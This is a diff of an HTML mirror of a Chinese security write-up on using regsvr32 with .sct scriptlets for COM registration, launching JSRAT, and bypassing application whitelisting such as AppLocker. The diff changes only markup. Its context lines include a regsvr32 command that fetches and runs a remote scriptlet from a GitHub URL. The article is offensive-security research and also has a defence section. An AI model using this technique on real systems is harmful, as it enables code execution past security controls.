@@ -3,18 +3,18 @@
 			<head>
 			     <title>Use SCT to Bypass Application Whitelisting Protection - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/15124">http://drops.wooyun.org/tips/15124</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
-<p>最近Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81d2ece8f5e9c1f2f4e3d5e4e4640907653b2a653b0765390165392b64243c660f2864053e661b05670b01643626">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，利用sct文件来实现的持久机制。 我对此也很感兴趣,于是对相关的内容作了研究学习，在学习过程中Casey Smith又教会了我很多，学会了一个绕过应用程序白名单的技巧，所以在此将学到的知识整理一下。</p>
+<p>最近Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81d2ece8f5e9c1f2f4e3d5e4e4640907653b2a653b0765390165392b64243c660f2864053e661b05670b01643626">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，利用sct文件来实现的持久机制。 我对此也很感兴趣,于是对相关的内容作了研究学习，在学习过程中Casey Smith又教会了我很多，学会了一个绕过应用程序白名单的技巧，所以在此将学到的知识整理一下。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/201604220237057896401.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/201604220237057896401.png" alt="enter image description here"></p>
 
 <!--more-->
 
@@ -24,7 +24,7 @@
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <h3>Regsvr32</h3>
 
@@ -69,7 +69,7 @@ dllname
 
 <h1>0x02 实例</h1>
 
-<hr />
+<hr>
 
 <h3>1、Component.sct</h3>
 
@@ -112,11 +112,11 @@ end function
 <pre><code>regsvr32 /i:"Component.sct" scrobj.dll
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023708288612-13.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/20160422023708288612-13.png" alt="enter image description here"></p>
 
 <p>如图，注册后在注册表<code>HKEY_CLASSES_ROOT\CLSID\</code>下同步创建键值<code>{10001111-0000-0000-0000-000000000001}</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023709267252-22.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/20160422023709267252-22.png" alt="enter image description here"></p>
 
 <p>注册表键值细节如下：</p>
 
@@ -148,7 +148,7 @@ MsgBox ref.Sum(4, 6)
 
 <p>执行后如图，成功调用COM组件</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023711338292-32.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/20160422023711338292-32.png" alt="enter image description here"></p>
 
 <h3>4、补充</h3>
 
@@ -229,7 +229,7 @@ WScript.Echo(x);
 
 <h1>0x03 应用1：JSRAT</h1>
 
-<hr />
+<hr>
 
 <h3>1、Casey的方法</h3>
 
@@ -327,7 +327,7 @@ x.Exec();
 
 <h1>0x04 应用2：绕过应用程序白名单过滤</h1>
 
-<hr />
+<hr>
 
 <p>标准的xml文件的内容如下：</p>
 
@@ -409,7 +409,7 @@ x.Exec();
 <pre><code>regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023714835792-41.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/20160422023714835792-41.png" alt="enter image description here"></p>
 
 <p>如图虽然能够成功弹出计算器，但是会弹框提示报错</p>
 
@@ -444,7 +444,7 @@ var c=ref.Exec();
 
 <h1>0x05 进阶用法</h1>
 
-<hr />
+<hr>
 
 <p>介绍到这里，你也许会认为，通过注册COM组件来绕过应用程序白名单的过滤得需要管理员权限，这会是一个鸡肋。</p>
 
@@ -464,11 +464,11 @@ var c=ref.Exec();
 
 <p>如图，普通用户权限，开启Windows AppLocker，成功执行js代码，弹出计算器，前面介绍的JSRAT的应用方法也可以用这种方式执行</p>
 
-<p><img src="http://static.wooyun.org//drops/20160422/20160422023717694262-51.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160422/20160422023717694262-51.png" alt="enter image description here"></p>
 
 <h1>0x06 补充</h1>
 
-<hr />
+<hr>
 
 <p>补充另一个sct的应用方法 前不久更新了JSRAT的内容，添加了自动识别代理进行通信的功能，因此JSRAT的启动代码变得更长：</p>
 
@@ -505,7 +505,7 @@ var c=ref.Exec();
 
 <h1>0x07 防御</h1>
 
-<hr />
+<hr>
 
 <p>综上，这个技巧的实现需要如下限制条件：</p>
 
@@ -516,19 +516,19 @@ var c=ref.Exec();
 
 <h1>0x08 小结</h1>
 
-<hr />
+<hr>
 
 <p>引用Casey博客的一句话:</p>
 
 <p>(<a href="http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html">http://subt0x10.blogspot.com/2016/04/setting-up-homestead-in-enterprise-with.html</a>)
 <strong>Well, now that everyone has eyes on PowerShell...Lets see what we can do with JavaScript!</strong></p>
 
-<p>再次感谢Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98cbf5f1ecf0d8ebedfaccfdfd7d37217e10097f380c7f312e7c20127f021c7d20367d1231">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，十分感谢。有待研究的细节还有很多，如果你对此感兴趣，可以一起交流。</p>
+<p>再次感谢Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98cbf5f1ecf0d8ebedfaccfdfd7d37217e10097f380c7f312e7c20127f021c7d20367d1231">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，十分感谢。有待研究的细节还有很多，如果你对此感兴趣，可以一起交流。</p>
 
 <p>更多学习资料：</p>
 
-<p>Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f2a19f9b869ab2818790a6979716497915497f177a5b15665aa1b1a61549671a4d75156b4f17627f177f671b6b62177a44156876177f68175c50176e42176f72">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，值得学习：
-(<a href="http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html">http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html</a>)</p>      </p>
+<p>Casey <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f2a19f9b869ab2818790a6979716497915497f177a5b15665aa1b1a61549671a4d75156b4f17627f177f671b6b62177a44156876177f68175c50176e42176f72">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>，值得学习：
+(<a href="http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html">http://subt0x10.blogspot.jp/2016/04/bypass-application-whitelisting-script.html</a>)</p>      <p></p>
     
 			</body>
 		</html>
